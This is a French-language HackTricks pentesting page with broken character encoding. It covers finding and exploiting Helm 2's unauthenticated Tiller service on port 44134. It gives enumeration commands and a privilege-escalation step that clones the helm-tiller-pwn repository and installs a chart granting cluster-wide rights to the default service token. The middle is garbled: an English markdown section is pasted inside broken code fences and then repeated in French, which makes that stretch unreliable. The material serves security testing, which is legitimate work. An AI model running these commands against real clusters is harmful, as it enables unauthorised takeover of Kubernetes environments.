<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Informations de base

Helm est le **gestionnaire de paquets** pour Kubernetes. Il permet de packager des fichiers YAML et de les distribuer dans des d√©p√¥ts publics et priv√©s. Ces paquets sont appel√©s **Helm Charts**. **Tiller** est le **service** **ex√©cut√©** par d√©faut sur le port 44134 offrant le service.

**Port par d√©faut :** 44134
```
PORT      STATE SERVICE VERSION
44134/tcp open  unknown
```
# √ânum√©ration

Si vous pouvez **√©num√©rer les pods et/ou services** de diff√©rents espaces de noms, √©num√©rez-les et recherchez ceux avec **"tiller" dans leur nom** :
```bash
kubectl get pods | grep -i "tiller"
kubectl get services | grep -i "tiller"
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
kubectl get pods -n <namespace> | grep -i "tiller"
kubectl get services -n <namespace> | grep -i "tiller"
```
```markdown
# Pentesting Tiller (Helm)

## Summary

Tiller, the server component of Helm, is often deployed with default settings that may lead to security issues. This section covers methods to exploit these weaknesses.

## Discovery

To discover Tiller instances, scan the cluster for services listening on port 44134, which is the default Tiller port.

## Exploitation

If you find a Tiller instance, you can attempt to exploit it. Since Tiller does not authenticate users by default, anyone can interact with it. This can lead to unauthorized access to the cluster's resources.

### Accessing the Tiller API

You can access the Tiller API using the `helm` command-line tool. If you have network access to the Tiller service, you can use the following command to list releases:

```bash
helm list --host <tiller_host>:44134
```

This command will show you the releases managed by Tiller.

### Deploying Malicious Charts

Helm charts are packages of pre-configured Kubernetes resources. You can create a malicious chart to compromise the cluster. Once you have access to Tiller, you can deploy your chart using:

```bash
helm install <chart_name> --host <tiller_host>:44134
```

This will deploy the chart to the cluster, potentially leading to a compromise.

## Remediation

To secure Tiller, consider the following:

- Implement authentication and authorization.
- Restrict network access to Tiller.
- Upgrade to Helm 3, which does not use Tiller.

## Conclusion

Tiller instances can be a weak point in Kubernetes clusters. By following the outlined pentesting steps, you can identify and mitigate these vulnerabilities.
```
```

# Pentesting Tiller (Helm)

## R√©sum√©

Tiller, le composant serveur de Helm, est souvent d√©ploy√© avec des param√®tres par d√©faut qui peuvent conduire √† des probl√®mes de s√©curit√©. Cette section couvre les m√©thodes pour exploiter ces faiblesses.

## D√©couverte

Pour d√©couvrir les instances de Tiller, scannez le cluster √† la recherche de services √©coutant sur le port 44134, qui est le port par d√©faut de Tiller.

## Exploitation

Si vous trouvez une instance de Tiller, vous pouvez tenter de l'exploiter. √âtant donn√© que Tiller n'authentifie pas les utilisateurs par d√©faut, n'importe qui peut interagir avec lui. Cela peut conduire √† un acc√®s non autoris√© aux ressources du cluster.

### Acc√©der √† l'API Tiller

Vous pouvez acc√©der √† l'API Tiller en utilisant l'outil en ligne de commande `helm`. Si vous avez un acc√®s r√©seau au service Tiller, vous pouvez utiliser la commande suivante pour lister les d√©ploiements :

```bash
helm list --host <tiller_host>:44134
```

Cette commande vous montrera les d√©ploiements g√©r√©s par Tiller.

### D√©ployer des Charts Malveillants

Les charts Helm sont des paquets de ressources Kubernetes pr√©-configur√©es. Vous pouvez cr√©er un chart malveillant pour compromettre le cluster. Une fois que vous avez acc√®s √† Tiller, vous pouvez d√©ployer votre chart en utilisant :

```bash
helm install <chart_name> --host <tiller_host>:44134
```

Cela d√©ploiera le chart dans le cluster, pouvant conduire √† un compromis.

## Rem√©diation

Pour s√©curiser Tiller, envisagez ce qui suit :

- Mettre en ≈ìuvre l'authentification et l'autorisation.
- Restreindre l'acc√®s r√©seau √† Tiller.
- Passer √† Helm 3, qui n'utilise pas Tiller.

## Conclusion

Les instances de Tiller peuvent √™tre un point faible dans les clusters Kubernetes. En suivant les √©tapes de pentesting d√©crites, vous pouvez identifier et att√©nuer ces vuln√©rabilit√©s.
```
```bash
kubectl get pods -n kube-system
NAME                                       READY   STATUS             RESTARTS   AGE
kube-scheduler-controlplane                1/1     Running            0          35m
tiller-deploy-56b574c76d-l265z             1/1     Running            0          35m

kubectl get services -n kube-system
NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE
kube-dns        ClusterIP   10.96.0.10     <none>        53/UDP,53/TCP,9153/TCP   35m
tiller-deploy   ClusterIP   10.98.57.159   <none>        44134/TCP                35m
```
Vous pourriez √©galement essayer de trouver ce service en cours d'ex√©cution en v√©rifiant le port 44134 :
```bash
sudo nmap -sS -p 44134 <IP>
```
Une fois d√©couvert, vous pouvez communiquer avec en t√©l√©chargeant l'application cliente helm. Vous pouvez utiliser des outils comme `homebrew`, ou consulter [**la page des versions officielles**](https://github.com/helm/helm/releases)**.** Pour plus de d√©tails, ou pour d'autres options, consultez [le guide d'installation](https://v2.helm.sh/docs/using_helm/#installing-helm).

Ensuite, vous pouvez **√©num√©rer le service** :
```
helm --host tiller-deploy.kube-system:44134 version
```
## √âl√©vation de privil√®ges

Par d√©faut, **Helm2** √©tait install√© dans l'**espace de noms kube-system** avec des **privil√®ges √©lev√©s**, donc si vous trouvez le service et y avez acc√®s, cela pourrait vous permettre d'**√©lever vos privil√®ges**.

Tout ce que vous avez √† faire est d'installer un package comme celui-ci : [**https://github.com/Ruil1n/helm-tiller-pwn**](https://github.com/Ruil1n/helm-tiller-pwn) qui donnera au **jeton de service par d√©faut l'acc√®s √† tout dans l'ensemble du cluster.**
```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
```
Dans [http://rui0.cn/archives/1573](http://rui0.cn/archives/1573), vous avez **l'explication de l'attaque**, mais essentiellement, si vous lisez les fichiers [**clusterrole.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrole.yaml) et [**clusterrolebinding.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrolebinding.yaml) dans _helm-tiller-pwn/pwnchart/templates/_, vous pouvez voir comment **tous les privil√®ges sont accord√©s au jeton par d√©faut**.


<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
